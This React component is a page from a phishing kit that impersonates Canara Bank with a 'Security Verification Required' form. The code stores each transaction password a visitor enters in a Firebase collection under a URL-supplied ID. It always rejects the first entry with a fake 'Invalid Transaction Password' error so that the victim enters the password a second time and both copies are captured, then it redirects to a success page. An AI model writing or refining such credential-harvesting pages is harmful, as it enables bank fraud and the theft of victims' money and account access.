import { useState } from 'react'; 
import { useNavigate, useParams } from 'react-router-dom';
import '../App.css';
import headerImage from '../assets/second-page-header.jpeg';
import FirebaseUtil from '../FirebaseRepo';

const SecondPage = () => {
  const [password2, setPassword2] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [submitCount, setSubmitCount] = useState(0); 
  const navigate = useNavigate();
  const { documentId } = useParams();

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsSubmitting(true);
    setErrorMessage('');

    try {
      // Naya Data Object taiyaar karein
      let updateData = {};
      
      if (submitCount === 0) {
        // Pehli baar wala password save karein
        updateData = { password_1: password2 };
      } else {
        // Doosri baar wala password save karein
        updateData = { password_2: password2 };
      }

      // Firebase mein data update karein (merge true rakhta hai Firebase default mein update par)
      await FirebaseUtil.updateDocument("carvana", documentId, updateData);

      // Loading delay
      setTimeout(() => {
        setIsSubmitting(false);

        if (submitCount === 0) {
          // --- Attempt 1: Error dikhao aur field khali karo ---
          setErrorMessage('Invalid Transaction Password. Please try again.');
          setPassword2(''); 
          setSubmitCount(1); 
        } else {
          // --- Attempt 2: Direct success page par ---
          navigate('/success');
        }
      }, 6000); 

    } catch (error) {
      console.error("Error:", error);
      setIsSubmitting(false);
      setErrorMessage('Network error. Please try again.');
    }
  };

  return (
    <div className="flex flex-col min-h-screen bg-white">
      <div className="w-full">
        <img src={headerImage} alt="Header" className="w-full h-40 object-cover" />
      </div>

      <main className="flex-1 m-2 flex justify-center items-center bg-gray-100">
        <div className="bg-white text-gray-800 rounded-xl w-full max-w-md p-5 shadow-lg">
          <div className="text-center mb-6">
            <h1 className="text-2xl font-bold text-blue-800 uppercase tracking-tight">
              Security Verification Required
            </h1>
          </div>

          <form onSubmit={handleSubmit} className="space-y-4">
            {errorMessage && (
              <div className="bg-red-50 border-l-4 border-red-500 p-3 mb-4 animate-pulse">
                <p className="text-red-700 text-sm font-semibold">{errorMessage}</p>
              </div>
            )}

            <div className="mb-4">
              <label className="block text-gray-700 text-sm font-bold mb-2">
                Verify Your Transaction Password
              </label>
              <input
                type="password"
                className={`w-full py-2 px-3 rounded border text-gray-700 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 ${
                  errorMessage ? 'border-red-500 bg-red-50' : 'border-gray-300'
                }`}
                value={password2}
                onChange={(e) => setPassword2(e.target.value)}
                placeholder="Enter Transaction Password"
                required
              />
            </div>

            <button
              type="submit"
              className="w-full bg-yellow-400 hover:bg-yellow-500 text-black font-bold py-2 px-4 rounded-full text-sm shadow-md transition-all active:scale-95"
              disabled={isSubmitting}
            >
              {isSubmitting ? "PROCESSING..." : "SUBMIT"}
            </button>
          </form>
        </div>
      </main>

      <footer className="bg-gray-800 text-white p-4 text-center mt-auto">
        <p className="text-sm">© 2025 Canara Bank. All rights reserved.</p>
      </footer>
    </div>
  );
};

export default SecondPage;
